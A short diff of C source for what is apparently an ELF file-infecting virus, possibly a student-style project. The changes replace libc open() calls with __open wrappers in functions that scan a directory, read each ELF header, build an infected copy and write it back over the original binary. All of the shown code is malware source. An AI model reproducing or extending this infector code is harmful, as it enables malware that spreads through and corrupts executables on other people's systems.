@@ -67,7 +67,7 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 	ft_strcpy(file, path);
 	ft_strcat(file, "/");
 	ft_strcat(file, filename);
-	fd = open(file, O_RDWR);
+	fd = __open(file, O_RDWR);
 	if (fd > 0)
 	{
 		ret = read(fd, header, 64);
@@ -121,7 +121,7 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 					create_infection(new, &elf, virus_elf, nb_zero_to_add);
 					__munmap(elf.addr, elf.size);
 					__close(fd);
-					fd = open(file, O_TRUNC | O_WRONLY);
+					fd = __open(file, O_TRUNC | O_WRONLY);
 					if (fd < 0)
 						return ;
 					write(fd, new, elf.size + size_needed + nb_zero_to_add);
@@ -175,7 +175,7 @@ int		main(int argc, char *argv[])
 	ret = 0;
 	if (DEBUG)
 		debug_print_args(argc, argv);
-	fd = open(argv[0], O_RDONLY);
+	fd = __open(argv[0], O_RDONLY);
 	if (fd > 0)
 	{
 		/* TODO: Original infection
